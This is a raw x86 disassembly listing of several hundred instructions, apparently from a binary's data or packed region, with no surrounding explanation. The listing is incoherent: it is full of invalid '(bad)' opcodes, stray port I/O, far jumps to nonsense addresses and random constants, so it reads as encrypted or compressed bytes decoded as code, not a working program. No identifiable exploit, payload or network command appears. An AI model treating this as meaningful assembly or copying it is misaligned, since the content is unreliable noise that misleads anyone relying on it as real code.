  419196:	shl    BYTE PTR [ebx+0x5b],1
  419199:	xchg   BYTE PTR [ebx],bh
  41919b:	xchg   ecx,eax
  41919c:	and    BYTE PTR [eax+0x5d],0x8b
  4191a0:	loope  0x41918f
  4191a2:	jg     0x419179
  4191a4:	out    0xb1,al
  4191a6:	les    ecx,FWORD PTR [ecx]
  4191a8:	or     esp,edi
  4191aa:	or     bl,BYTE PTR [ecx-0x6d]
  4191ad:	sub    eax,0x76de2fb8
  4191b2:	ds leave 
  4191b4:	mov    dl,0x9b
  4191b6:	inc    ebx
  4191b7:	mov    eax,ds:0xc83a1825
  4191bc:	addr16 mov ds:0x9e50,al
  4191c0:	je     0x41922d
  4191c2:	xor    eax,DWORD PTR [edi+0x75ccc953]
  4191c8:	ja     0x4191cf
  4191ca:	nop
  4191cb:	mov    ah,0xb4
  4191cd:	jo     0x419160
  4191cf:	dec    edi
  4191d0:	pop    esp
  4191d1:	xchg   esp,eax
  4191d2:	shr    DWORD PTR [ebx-0x6a],1
  4191d5:	pop    eax
  4191d6:	push   edx
  4191d7:	xchg   edx,eax
  4191d8:	and    eax,0xfc72071
  4191dd:	adc    eax,0x31afb56d
  4191e2:	xor    eax,DWORD PTR [edi]
  4191e4:	es jl  0x4191dd
  4191e7:	imul   eax,DWORD PTR [esi-0x6ba11c3c],0x35
  4191ee:	out    0xfa,eax
  4191f0:	push   ebp
  4191f1:	cli    
  4191f2:	inc    eax
  4191f3:	xor    dh,BYTE PTR gs:0x9942cd2
  4191fa:	int3   
  4191fb:	push   esp
  4191fc:	mov    bl,0x88
  4191fe:	mov    ecx,0x1c943905
  419203:	ins    BYTE PTR es:[edi],dx
  419204:	mov    esp,0x78119cd7
  419209:	(bad)  
  41920a:	inc    edx
  41920b:	pop    edi
  41920c:	pop    esp
  41920d:	and    dl,0xd9
  419210:	out    0xbb,al
  419212:	jno    0x4191cc
  419214:	dec    ebx
  419215:	js     0x419200
  419217:	mov    BYTE PTR [ebp+0x42],dh
  41921a:	(bad)  
  41921b:	mov    edx,0x88ae95ec
  419220:	pop    esi
  419221:	dec    esp
  419222:	push   ecx
  419223:	out    0xbc,eax
  419225:	mov    ah,0x4d
  419227:	call   0x4af00bc5
  41922c:	je     0x4191f8
  41922e:	pop    es
  41922f:	repnz (bad) 
  419231:	lahf   
  419232:	jmp    0xbdaf:0x20438529
  419239:	push   edi
  41923a:	fldenv [esi]
  41923c:	sbb    dl,ch
  41923e:	or     al,ah
  419240:	ret    0x1c7f
  419243:	sar    DWORD PTR [edx],cl
  419245:	inc    eax
  419246:	daa    
  419247:	mov    ecx,0x21ea001
  41924c:	and    DWORD PTR [edi],0x5f224f82
  419252:	lahf   
  419253:	leave  
  419254:	sbb    al,BYTE PTR [ebp+0x37]
  419257:	bound  esp,QWORD PTR [ebx+0x70de6d19]
  41925d:	dec    esi
  41925e:	shr    DWORD PTR [ecx+0x35],1
  419261:	push   ss
  419262:	sbb    eax,0x13536948
  419267:	jnp    0x4192ab
  419269:	and    al,0xb1
  41926b:	push   edi
  41926c:	xchg   edx,eax
  41926d:	lock shr DWORD PTR [ebx+ecx*4+0x77],1
  419272:	leave  
  419273:	aaa    
  419274:	in     al,dx
  419275:	dec    esp
  419276:	push   ecx
  419277:	(bad)  
  419279:	sub    BYTE PTR [edx-0x19],dh
  41927c:	xchg   esi,eax
  41927d:	cmp    al,0xa4
  41927f:	sub    DWORD PTR [ebp-0x2b24f4f],ebx
  419285:	jb     0x419271
  419287:	inc    eax
  419288:	mov    esi,0x71997bb0
  41928d:	test   DWORD PTR [ecx-0x13c7aea6],ebp
  419293:	adc    al,0xaa
  419295:	add    bh,BYTE PTR [ecx+eiz*2-0x2bc8e452]
  41929c:	sub    dh,BYTE PTR [esi]
  41929e:	fimul  DWORD PTR [ecx]
  4192a0:	retf   
  4192a1:	xchg   esp,eax
  4192a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192a3:	shl    BYTE PTR [esi],1
  4192a5:	sbb    eax,0xa0692546
  4192aa:	out    dx,eax
  4192ab:	out    dx,eax
  4192ac:	call   0xac63478d
  4192b1:	sar    BYTE PTR ds:0x1f6c91c8,0x52
  4192b8:	add    al,0xbb
  4192ba:	not    BYTE PTR [ebp-0x50e99a8d]
  4192c0:	mov    cl,0xbe
  4192c2:	xor    DWORD PTR [eax],0xb11eaed2
  4192c8:	sub    DWORD PTR [ebx+0x7456fae3],ebx
  4192ce:	push   ebp
  4192cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192d0:	adc    al,0x92
  4192d2:	aas    
  4192d3:	push   ds
  4192d4:	inc    DWORD PTR [ebx+0x17cdd5bb]
  4192da:	loope  0x419282
  4192dc:	jns    0x41933c
  4192de:	cmp    al,BYTE PTR ds:0x6211bac8
  4192e4:	sub    ah,BYTE PTR [edi+edx*8]
  4192e7:	stc    
  4192e8:	xchg   ebx,eax
  4192e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192ea:	xchg   edx,eax
  4192eb:	outs   dx,DWORD PTR ds:[esi]
  4192ec:	sub    BYTE PTR [edi],bl
  4192ee:	cmc    
  4192ef:	mov    al,0x4b
  4192f1:	dec    ecx
  4192f2:	pop    ss
  4192f3:	sbb    edi,DWORD PTR [ebx-0x4a]
  4192f6:	inc    edi
  4192f7:	idiv   esi
  4192f9:	retf   0x3611
  4192fc:	sbb    eax,esp
  4192fe:	cwde   
  4192ff:	xchg   ecx,eax
  419300:	mov    ebx,0x8d3f91b6
  419305:	mul    BYTE PTR [edi+0x57]
  419308:	in     al,0x76
  41930a:	pop    ecx
  41930b:	pop    ecx
  41930c:	aad    0x45
  41930e:	test   esp,0x7f24747f
  419314:	mov    al,ds:0xe82ebed7
  419319:	test   WORD PTR [esi-0x32],cx
  41931d:	and    BYTE PTR [edi-0x5c85f183],ch
  419323:	icebp  
  419324:	mov    ebp,0xe95a6f03
  419329:	mov    ebx,0xc6593d2
  41932e:	sub    esp,esi
  419330:	imul   esi,ebx,0x2153b603
  419336:	lds    esi,FWORD PTR [ebx-0x3c3ee87a]
  41933c:	dec    ebp
  41933d:	mov    edi,0xfa94f03d
  419342:	add    DWORD PTR [esi-0x40],edi
  419345:	jl     0x419312
  419347:	retf   0x3173
  41934a:	adc    eax,DWORD PTR [eax-0x53]
  41934d:	aas    
  41934e:	std    
  41934f:	les    edi,FWORD PTR [esp+edx*1+0x327ad342]
  419356:	xor    al,0xcb
  419358:	xchg   ecx,eax
  419359:	fld    TBYTE PTR [eax-0x58]
  41935c:	retf   
  41935d:	sub    BYTE PTR [ebp+0x47e3699c],0x16
  419364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419365:	in     eax,0x1e
  419367:	repz adc eax,0x44d5da38
  41936d:	je     0x41931a
  41936f:	fisub  WORD PTR [edx+edx*4]
  419372:	cwde   
  419373:	mov    fs:0x3dd15015,eax
  419379:	out    0x62,eax
  41937b:	push   cs
  41937c:	mov    ebp,0x68373f0b
  419381:	push   edi
  419382:	adc    al,BYTE PTR [ebx+0x1d]
  419385:	pop    es
  419386:	mov    esi,ss
  419388:	mov    dh,0x9e
  41938a:	pop    ds
  41938b:	push   edi
  41938c:	sbb    BYTE PTR [ebx+0x78],dh
  41938f:	inc    esi
  419390:	imul   esi,DWORD PTR [eax+0x38],0x58ec85fa
  419397:	mov    bh,0x31
  419399:	inc    edi
  41939a:	in     eax,dx
  41939b:	xchg   esp,eax
  41939c:	xor    al,ah
  41939e:	bound  esp,QWORD PTR [eax]
  4193a0:	jge    0x419362
  4193a2:	dec    ecx
  4193a3:	cmp    DWORD PTR [edx-0x724fcf1],0xd372de88
  4193ad:	out    0x80,al
  4193af:	fadd   QWORD PTR [ecx]
  4193b1:	loopne 0x419387
  4193b3:	inc    ebp
  4193b4:	sar    BYTE PTR [eax],cl
  4193b6:	add    bh,BYTE PTR [edx+0x5462dffd]
  4193bc:	repnz cmp dh,BYTE PTR [edx+ebx*4+0x4d170e27]
  4193c4:	std    
  4193c5:	push   cs
  4193c6:	push   edx
  4193c7:	pop    ss
  4193c8:	dec    edx
  4193c9:	outs   dx,DWORD PTR ds:[esi]
  4193ca:	and    dl,bl
  4193cc:	jo     0x419355
  4193ce:	push   edi
  4193cf:	(bad)  
  4193d0:	mov    ebp,0xc6d7310d
  4193d5:	cdq    
  4193d6:	(bad)  
  4193d7:	(bad)  
  4193d8:	loop   0x4193ba
  4193da:	pushf  
  4193db:	xlat   BYTE PTR ds:[ebx]
  4193dc:	pop    edi
  4193dd:	aad    0xe9
  4193df:	dec    ecx
  4193e0:	loop   0x419373
  4193e2:	lock out dx,eax
  4193e4:	shr    DWORD PTR [edx*1+0x52bb6d26],cl
  4193eb:	sti    
  4193ec:	pusha  
  4193ed:	test   BYTE PTR [edx+0x5d],ah
  4193f0:	ins    BYTE PTR es:[edi],dx
  4193f1:	retf   0xefc5
  4193f4:	cmc    
  4193f5:	repz push es
  4193f7:	sbb    ch,BYTE PTR [esi]
  4193f9:	stos   BYTE PTR es:[edi],al
  4193fa:	lock cdq 
  4193fc:	mov    bl,0xd4
  4193fe:	pop    edi
  4193ff:	mov    eax,0xc751a576
  419404:	cmp    DWORD PTR [si-0x3b65],edi
  419409:	dec    edi
  41940a:	and    eax,0xdde8a52a
  41940f:	xchg   DWORD PTR [edx+0x3f],esi
  419412:	sub    eax,0xeb1bd91a
  419417:	xor    esi,DWORD PTR [ebp-0x18]
  41941a:	aaa    
  41941b:	nop
  41941c:	jmp    0x4c3d8f84
  419421:	add    edi,DWORD PTR [ebp-0x12]
  419424:	mov    cl,BYTE PTR [edx+0x2b]
  419427:	scas   eax,DWORD PTR es:[edi]
  419428:	dec    DWORD PTR [ecx]
  41942a:	jo     0x419458
  41942c:	shr    cl,0xe4
  41942f:	add    eax,0x42a48e09
  419434:	(bad)  
  419435:	pop    esi
  419436:	xor    al,0xa7
  419438:	pop    eax
  419439:	(bad)  [edi]
  41943b:	sbb    ah,al
  41943d:	jo     0x419432
  41943f:	add    BYTE PTR [ebx-0x7b9d1287],dl
  419445:	mov    ch,0x2c
  419447:	popa   
  419448:	cmp    al,0x92
  41944a:	std    
  41944b:	add    edi,ebp
  41944d:	sub    al,0x56
  41944f:	mov    dh,0xbe
  419451:	sbb    DWORD PTR [edx],eax
  419453:	jbe    0x41942c
  419455:	test   DWORD PTR [eax+0x7d948e06],eax
  41945b:	out    dx,eax
  41945c:	lock test eax,0xf371a603
  419462:	pop    edi
  419463:	gs mov ch,0xb6
  419466:	retf   0xf9fe
  419469:	int3   
  41946a:	ja     0x41942b
  41946c:	test   BYTE PTR [ebx+ebp*2+0x14],ah
  419470:	cdq    
  419471:	icebp  
  419472:	sub    eax,0xa3668ba1
  419477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419478:	mov    esp,0x19451efc
  41947d:	mov    cl,0x2
  41947f:	jmp    0x4194c1
  419481:	jmp    0x419495
  419483:	mov    al,ds:0x1783e49e
  419488:	jb     0x419480
  41948a:	ror    BYTE PTR [eax],cl
  41948c:	mov    ecx,0xf7368e94
  419491:	and    BYTE PTR [ebx-0x6fee8627],0x51
  419498:	in     al,0xdf
  41949a:	add    DWORD PTR [ecx],ebp
  41949c:	fsubr  DWORD PTR ds:0x43822cd2
  4194a2:	ja     0x419510
  4194a4:	mov    al,BYTE PTR [edi-0x23225249]
  4194aa:	pop    ebx
  4194ab:	and    al,0x60
  4194ad:	sbb    BYTE PTR [edx+0x1078595b],dh
  4194b3:	mov    esp,0x2ff3bb1f
  4194b8:	sub    BYTE PTR [ebx],cl
  4194ba:	out    dx,eax
  4194bb:	repz pop esi
  4194bd:	in     eax,dx
  4194be:	ja     0x419473
  4194c0:	fsubrp st(4),st
  4194c2:	jne    0x4194d0
  4194c4:	add    ch,BYTE PTR [edx-0x64]
  4194c7:	int3   
  4194c8:	test   DWORD PTR [esi-0x55],ecx
  4194cb:	mov    ecx,0x89663c62
  4194d0:	mov    edi,edi
  4194d2:	mov    ds:0x19142f14,al
  4194d7:	xchg   esi,eax
  4194d8:	xchg   edx,eax
  4194d9:	mov    DWORD PTR ds:0x483f9d10,edi
  4194df:	(bad)  
  4194e0:	and    ch,0x7d
  4194e3:	mov    ebp,0x5a2f9073
  4194e8:	push   ebp
  4194e9:	pushf  
  4194ea:	mov    eax,fs
  4194ec:	adc    DWORD PTR [ecx-0x3a2da4e6],eax
  4194f2:	mov    eax,ds:0x81adc4a3
  4194f7:	or     DWORD PTR [ecx],eax
  4194f9:	xor    al,0xd4
  4194fb:	dec    esi
  4194fc:	cmp    edi,DWORD PTR [esi-0x62]
  4194ff:	push   0xffffffd9
  419501:	das    
  419502:	xchg   BYTE PTR [ecx-0x7b],dl
  419505:	mov    cl,0xd3
  419507:	(bad)  
  419508:	and    cl,BYTE PTR [edi]
  41950a:	push   0x31a8a3db
  41950f:	lods   eax,DWORD PTR ds:[esi]
  419510:	fisttp QWORD PTR [edi+ebp*4+0x28643971]
  419517:	(bad)  
  419518:	out    dx,eax
  419519:	mov    bh,0xec
  41951b:	mov    ds:0x6b07fcf3,eax
  419520:	and    DWORD PTR [ecx-0x7a],ebp
  419523:	adc    eax,0x9137476a
  419528:	stos   BYTE PTR es:[edi],al
  419529:	mov    edx,0x35a06763
  41952e:	inc    ecx
  41952f:	add    edi,esp
  419531:	or     DWORD PTR [eax],esi
  419533:	mov    ch,0x2
  419535:	fist   WORD PTR [ebx+eiz*8+0x3c]
  419539:	sti    
  41953a:	mov    ebx,0x543e01a6
  41953f:	cmp    DWORD PTR [eax+0x2c],0xffffffc2
  419543:	ss jp  0x4194f2
  419546:	push   edx
  419547:	test   DWORD PTR [ebx-0x20],0x4e62eaa4
  41954e:	push   0xffffffee
  419550:	imul   BYTE PTR [esi]
  419552:	pop    esi
  419553:	sbb    ebp,DWORD PTR [ebx+0x55]
  419556:	lock mov edx,0x29665a5c
  41955c:	(bad)  
  41955d:	dec    edi
  41955e:	repz mov ebx,fs
  419561:	pop    es
  419562:	addr16 pop ss
  419564:	xor    ecx,DWORD PTR [edx]
  419566:	sub    BYTE PTR [ecx+0xa2c2f39],0xbe
  41956d:	out    0x5,al
  41956f:	out    dx,al
  419570:	scas   al,BYTE PTR es:[edi]
  419571:	fcmovbe st,st(3)
  419573:	mov    dl,0x81
  419575:	out    dx,eax
  419576:	retf   
  419577:	push   edi
  419578:	aaa    
  419579:	push   ecx
  41957a:	bound  ebx,QWORD PTR [ecx+ebx*2+0x424f5f02]
  419581:	or     BYTE PTR [edx+ebx*8],ah
  419584:	jnp    0x4195b5
  419586:	xor    DWORD PTR [edx-0x44],esi
  419589:	mov    ?,WORD PTR [ebx]
  41958b:	cmc    
  41958c:	jo     0x4195c2
  41958e:	lea    ebx,[edx]
  419590:	rol    bl,0x80
  419593:	aam    0x55
  419595:	mov    cl,BYTE PTR [edi-0x482c5ed6]
  41959b:	pop    es
  41959c:	push   ebx
  41959d:	adc    ah,dh
  41959f:	pop    edi
  4195a0:	fnstsw WORD PTR [ebx+ebx*8+0x75]
  4195a4:	add    eax,0xf18d353f
  4195a9:	add    al,0x5c
  4195ab:	gs inc ecx
  4195ad:	rol    bh,cl
  4195af:	out    dx,eax
  4195b0:	pop    edx
  4195b1:	pop    esp
  4195b2:	ret    
  4195b3:	add    esp,DWORD PTR [edx+0x10]
  4195b6:	loop   0x41954f
  4195b8:	pop    ecx
  4195b9:	in     al,0xb1
  4195bb:	rol    BYTE PTR [eax+esi*8-0x39],cl
  4195bf:	nop
  4195c0:	std    
  4195c1:	push   ebx
  4195c2:	cld    
  4195c3:	jg     0x419568
  4195c5:	sub    BYTE PTR [ebp-0x32],dl
  4195c8:	bound  edx,QWORD PTR [edi]
  4195ca:	arpl   WORD PTR [ecx],cx
  4195cc:	loope  0x4195ce
  4195ce:	bound  ecx,QWORD PTR [eax]
  4195d0:	xchg   esi,eax
  4195d1:	xchg   BYTE PTR [ecx+0x52],ch
  4195d4:	xor    al,0x49
  4195d6:	idiv   DWORD PTR [ebp-0x69060250]
  4195dc:	in     al,dx
  4195dd:	push   ds
  4195de:	invd   
  4195e0:	jnp    0x419573
  4195e2:	lods   al,BYTE PTR ds:[esi]
  4195e3:	pop    es
  4195e4:	dec    BYTE PTR [esi-0x61]
  4195e7:	inc    edx
  4195e8:	jl     0x4195ed
  4195ea:	or     eax,0xc9fc7985
  4195ef:	sbb    esi,ebx
  4195f1:	pushf  
  4195f2:	pop    ds
  4195f3:	rol    DWORD PTR [ebx+0x4d],1
  4195f6:	test   al,0x5e
  4195f8:	out    0x6f,ax
  4195fb:	cmc    
  4195fc:	cmp    al,0xb9
  4195fe:	add    DWORD PTR [edx+0x53],0x79cbd304
  419605:	jno    0x419601
  419607:	mov    eax,0xd7a0efed
  41960c:	outs   dx,BYTE PTR ds:[esi]
  41960d:	mov    ah,0x39
  41960f:	mov    BYTE PTR cs:[ebp+0x202b1b58],cl
  419616:	icebp  
  419617:	sub    al,dl
  419619:	pop    ebp
  41961a:	rol    DWORD PTR [ebx-0x2d],cl
  41961d:	xchg   ecx,eax
  41961e:	sbb    eax,0x27dcc0c3
  419623:	inc    esi
  419624:	cmp    ch,dl
  419626:	push   ebp
  419627:	scas   al,BYTE PTR es:[edi]
  419628:	int    0x3e
  41962a:	mov    eax,0x43122ef4
  41962f:	pop    esp
  419630:	sar    BYTE PTR [edx+0x15],0x68
  419634:	fst    DWORD PTR [edi-0x18]
  419637:	shl    BYTE PTR [edi+eiz*1],1
  41963a:	ffree  st(5)
  41963c:	aaa    
  41963d:	lea    ebx,[esi-0x5a]
  419640:	call   0xa3e154f5
  419645:	jo     0x419653
  419647:	xor    esp,DWORD PTR [edi-0x4d12ccfe]
  41964d:	clc    
  41964e:	inc    ebp
  41964f:	lods   eax,DWORD PTR ds:[esi]
  419650:	out    dx,eax
  419651:	lods   eax,DWORD PTR ds:[esi]
  419652:	adc    eax,0x3684e54
  419657:	mov    al,0x79
  419659:	jp     0x4195fc
  41965b:	in     al,dx
  41965c:	int    0x65
  41965e:	xchg   ebp,eax
  41965f:	mov    BYTE PTR [ebx-0x64],al
  419662:	pop    edi
  419663:	add    bh,BYTE PTR [eax]
  419665:	mov    DWORD PTR [ebp-0x6bbe1b4c],eax
  41966b:	popa   
  41966c:	imul   esp,DWORD PTR [ebp-0x13e7e9ff],0x4
  419673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419674:	push   cs
  419675:	imul   eax,DWORD PTR [ecx+eiz*8+0x74],0xbd125b6b
  41967d:	arpl   WORD PTR [ecx-0xe2ae1a6],bx
  419683:	scas   al,BYTE PTR es:[edi]
  419684:	push   esp
  419685:	jne    0x4196b4
  419687:	arpl   WORD PTR [eax+edi*4],bp
  41968a:	mov    edi,0x4ed57258
  41968f:	fidivr WORD PTR [eax+0x7b9f3e40]
  419695:	aam    0x1f
  419697:	mov    WORD PTR [edi+0x5a],fs
  41969a:	bnd jbe 0x4196e8
  41969d:	adc    al,0x49
  41969f:	pusha  
  4196a0:	sub    BYTE PTR [esi+0x1cff98a6],dh
  4196a6:	fcompp 
  4196a8:	ja     0x419715
  4196aa:	inc    esp
  4196ab:	dec    edx
  4196ac:	fwait
  4196ad:	sbb    esi,DWORD PTR [ebx+esi*4+0x34]
  4196b1:	or     al,0x51
  4196b3:	jbe    0x4196c1
  4196b5:	pop    esp
  4196b6:	test   al,0xe8
  4196b8:	push   0xffffff85
  4196ba:	lahf   
  4196bb:	daa    
  4196bc:	pop    ebx
  4196bd:	cmp    eax,0x3451497f
  4196c2:	add    al,0xfd
  4196c4:	stos   DWORD PTR es:[edi],eax
  4196c5:	fsubr  DWORD PTR [edx]
  4196c7:	push   ss
  4196c8:	mov    BYTE PTR [eax+0x57273e31],ch
  4196ce:	mov    al,ds:0x2f875466
  4196d3:	dec    ebx
  4196d4:	inc    ebp
  4196d6:	daa    
  4196d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196d8:	fisub  WORD PTR [ebx]
  4196da:	add    BYTE PTR [ebx+0xa],ch
  4196dd:	cwde   
  4196de:	dec    ebx
  4196df:	mov    bl,0x70
  4196e1:	xlat   BYTE PTR ds:[ebx]
  4196e2:	ror    BYTE PTR [edx-0x5ee463d2],0x14
  4196e9:	sub    DWORD PTR [ebx],eax
  4196eb:	xor    DWORD PTR [esi],edx
  4196ed:	jnp    0x41974a
  4196ef:	(bad)  
  4196f0:	ins    BYTE PTR es:[edi],dx
  4196f1:	call   0x78bb40e6
  4196f6:	mov    di,0x5d70
  4196fa:	inc    esi
  4196fb:	or     ebp,DWORD PTR [edx-0xcd1f4ad]
  419701:	out    0x17,al
  419703:	cld    
  419704:	pop    ebx
  419705:	jae    0x419780
  419707:	imul   eax,ebp,0x8228545b
  41970d:	in     eax,dx
  41970e:	sbb    BYTE PTR [edi],cl
  419710:	aam    0x7
  419712:	test   eax,0x690e1478
  419717:	add    al,0x51
  419719:	mov    al,0xd
  41971b:	xor    BYTE PTR [edi],dh
  41971d:	(bad)  
  41971e:	pcmpgtd mm4,QWORD PTR [esi+0x40]
  419722:	out    dx,al
  419723:	push   esi
  419724:	push   edx
  419725:	mov    ecx,0x8149f2ae
  41972a:	scas   al,BYTE PTR es:[edi]
  41972b:	jp     0x41978e
  41972d:	adc    al,0xa
  41972f:	pop    ebx
  419730:	test   eax,0x913ebe81
  419735:	mov    cl,0x76
  419737:	sbb    eax,0x69a11ca6
  41973c:	sub    eax,0xc08b0256
  419741:	add    eax,0xb21ca2f3
  419746:	daa    
  419747:	and    cl,BYTE PTR [ebx+0x2cf8ef58]
  41974d:	hlt    
  41974e:	or     al,0x0
  419750:	rol    edx,cl
  419752:	adc    al,0x6b
  419754:	jo     0x4197b8
  419756:	aaa    
  419757:	sbb    BYTE PTR [ecx+0x38],dl
  41975a:	adc    eax,0x1481e9aa
  41975f:	push   ebx
  419760:	push   cs
  419761:	inc    edi
  419762:	jae    0x4197b4
  419764:	sahf   
  419765:	aas    
  419766:	jge    0x419773
  419768:	push   ebp
  419769:	outs   dx,BYTE PTR ds:[esi]
  41976a:	push   ebp
  41976b:	xlat   BYTE PTR ds:[ebx]
  41976c:	and    al,0x24
  41976e:	mov    eax,ds:0xe26145cd
  419773:	mov    ds:0xa47a0c3a,al
  419778:	lds    esp,FWORD PTR [ebx]
  41977a:	mov    ebx,es
  41977c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41977d:	mov    ah,0xd2
  41977f:	mov    edi,DWORD PTR [ebp-0x6e0e0177]
  419785:	lea    esi,[eax-0x47]
  419788:	add    edx,DWORD PTR [edx-0x1d]
  41978b:	pop    ds
  41978c:	or     esp,DWORD PTR [ebx-0x22b5b35b]
  419792:	fst    DWORD PTR [eax-0x1f]
  419795:	mov    cs,eax
  419797:	rol    DWORD PTR [edx],cl
  419799:	jbe    0x41971f
  41979b:	dec    eax
  41979c:	sahf   
  41979d:	push   0x8f671c42
  4197a2:	mov    dh,0x5f
  4197a4:	aas    
  4197a5:	jb     0x419728
  4197a7:	mov    ebx,0x65fbd1a4
  4197ac:	in     al,0x23
  4197ae:	mov    WORD PTR [edx+esi*1],?
  4197b1:	push   ebx
  4197b2:	jg     0x41973f
  4197b4:	ret    0x9fe5
  4197b7:	aas    
  4197b8:	xchg   esi,eax
  4197b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197ba:	in     eax,dx
  4197bb:	lods   eax,DWORD PTR ds:[esi]
  4197bc:	in     eax,0x8e
  4197be:	pop    es
  4197bf:	std    
  4197c0:	repz popa 
  4197c2:	mov    esi,0x95e7699
  4197c7:	mov    ebx,0x56be12f8
  4197cc:	cmp    BYTE PTR [edx+eax*2-0x77],dh
  4197d0:	mov    esi,0x945b127a
  4197d5:	(bad)
  4197d8:	sub    ebp,edi
  4197da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197db:	or     al,0x2f
  4197dd:	jo     0x4197eb
  4197df:	push   esi
  4197e0:	mov    esi,0xe7817630
  4197e5:	jb     0x4197a1
  4197e7:	mov    bl,0x1d
  4197e9:	repz in eax,0x1b
  4197ec:	data16 jns 0x4197bf
  4197ef:	pop    ecx
  4197f0:	imul   eax,ebx,0x34378d9c
  4197f6:	test   DWORD PTR [ebp+ebx*8-0x4e],edx
  4197fa:	in     al,dx
  4197fb:	mov    cl,0xf3
  4197fd:	mov    ds:0x6b946833,al
  419802:	pushf  
  419803:	dec    esp
  419804:	cmp    al,0xe8
  419806:	and    BYTE PTR [ebx+0x31],0x46
  41980a:	and    al,0x4f
  41980c:	add    al,0xdb
  41980e:	outs   dx,BYTE PTR ds:[esi]
  41980f:	loopne 0x4197cf
  419811:	sbb    eax,0x389cea83
  419816:	retf   
  419817:	stos   BYTE PTR es:[edi],al
  419818:	adc    eax,DWORD PTR [eax]
  41981a:	inc    esi
  41981b:	and    BYTE PTR [ebp+0x5c894e0e],ch
  419821:	cmp    DWORD PTR fs:[edx+0x2dbaed80],0x3a307964
  41982c:	retf   0x3841
  41982f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419830:	or     BYTE PTR [edi-0x47],dh
  419833:	out    0x46,al
  419835:	lds    esp,FWORD PTR [ebx-0x83149f7]
  41983b:	pop    ds
  41983c:	(bad)  
  41983e:	nop
  41983f:	sub    dh,BYTE PTR [edx]
  419841:	push   eax
  419842:	jbe    0x419857
  419844:	mov    bh,0xdb
  419846:	rol    DWORD PTR [edx],cl
  419848:	fld    TBYTE PTR [edx+0x3db3613d]
  41984e:	xchg   ecx,eax
  41984f:	fimul  WORD PTR [ecx]
  419851:	xchg   ebx,eax
  419852:	mov    dh,0xf3
  419854:	leave  
  419855:	mov    esi,0x3cc692e9
  41985a:	push   esi
  41985b:	in     al,dx
  41985c:	gs mov bh,0x87
  41985f:	pop    ecx
  419860:	xchg   ebp,eax
  419861:	sub    eax,0xa94271c
  419866:	or     BYTE PTR [ecx+eax*8+0x72a514d5],dl
  41986d:	int    0x8f
  41986f:	sub    bh,bh
  419871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419872:	arpl   WORD PTR [ecx+0x15],cx
  419875:	(bad)  
  419876:	push   0xf26b322d
  41987b:	mov    ah,0xe2
  41987d:	test   eax,0x63c9bdcb
  419882:	mov    ds:0x9a937bc0,al
  419887:	arpl   WORD PTR [ebx],dx
  419889:	adc    al,dh
  41988b:	rcl    DWORD PTR [ebx],cl
  41988d:	mov    dh,0xab
  41988f:	sti    
  419890:	or     eax,0x7a2ce34c
  419895:	mov    al,0xc2
  419897:	loope  0x4198bc
  419899:	ds stos BYTE PTR es:[edi],al
  41989b:	dec    ebp
  41989c:	jae    0x4198c4
  41989e:	sbb    al,0x8
  4198a0:	imul   ecx,edx,0x8aeeef71
  4198a6:	dec    eax
  4198a7:	adc    dl,BYTE PTR [edi-0x5af4cad4]
  4198ad:	bound  eax,QWORD PTR [esp+ebp*1-0xa]
  4198b1:	and    eax,0x5b4e5823
  4198b6:	setnp  BYTE PTR [eax+0x21b8d086]
  4198bd:	stos   BYTE PTR es:[edi],al
  4198be:	fcom   DWORD PTR [eax+0x67]
  4198c1:	sub    esi,DWORD PTR [edx+edx*1+0x39]
  4198c5:	push   0x44ded34b
  4198ca:	dec    ebx
  4198cb:	pop    eax
  4198cc:	add    ebp,ecx
  4198ce:	inc    esp
  4198cf:	(bad)  
  4198d0:	inc    DWORD PTR [esi-0x27]
  4198d3:	ret    0x5093
  4198d6:	das    
  4198d7:	loope  0x4198bb
  4198d9:	jno    0x4198b8
  4198db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198dc:	pop    ecx
  4198dd:	mov    ebx,0x16ae1121
  4198e2:	mov    dh,ah
  4198e4:	std    
  4198e5:	imul   esi
  4198e7:	mov    ebp,0x61aad7fa
  4198ec:	pop    ebx
  4198ed:	mov    DWORD PTR [edi],ebp
  4198ef:	cmp    eax,0xe980990e
  4198f4:	ret    
  4198f5:	les    eax,FWORD PTR [edx+edx*1+0x6d21c311]
  4198fc:	daa    
  4198fd:	(bad)  
  4198fe:	jo     0x4198b6
  419900:	xor    ecx,edi
  419902:	inc    edi
  419903:	ss or  eax,0xaa1b20c0
  419909:	dec    eax
  41990a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990d:	push   edx
  41990e:	mov    ah,0x4d
  419910:	dec    esp
  419911:	push   0x76947dfa
  419916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419917:	inc    BYTE PTR [ecx-0x1e384226]
  41991d:	ret    
  41991e:	je     0x419986
  419920:	repz cli 
  419922:	ss push esp
  419924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419925:	or     eax,0x4453ec85
  41992a:	dec    ecx
  41992b:	cmp    esp,DWORD PTR [ecx+edi*4-0x162b80be]
  419932:	push   ds
  419933:	fsub   DWORD PTR [edx-0xd870605]
  419939:	adc    DWORD PTR [esi+0x5062a6bf],edi
  41993f:	cmp    al,0x5c
  419941:	mov    eax,DWORD PTR [ecx]
  419943:	dec    edi
  419944:	dec    esp
  419945:	jns    0x4199c2
  419947:	arpl   WORD PTR [ebp+eiz*1-0x19a1f53],ax
  41994e:	call   0xd5f6:0xa2eda22f
  419955:	popa   
  419956:	sub    BYTE PTR [ebx-0x2a1de7b9],0x4c
  41995d:	sub    al,0xa0
  41995f:	sbb    ebp,edi
  419961:	mov    ebx,0x76c29e7a
  419966:	in     al,0xdf
  419968:	sbb    DWORD PTR [ecx],0xffffffa3
  41996b:	aaa    
